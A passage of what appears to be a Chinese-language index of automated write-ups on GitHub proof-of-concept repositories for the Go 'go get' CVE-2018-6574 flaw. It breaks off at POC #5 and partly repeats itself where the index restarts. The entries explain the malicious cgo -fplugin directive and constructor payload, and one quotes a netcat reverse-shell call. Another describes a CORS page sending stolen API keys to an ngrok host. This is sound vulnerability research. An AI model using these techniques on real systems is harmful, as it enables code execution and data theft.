4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

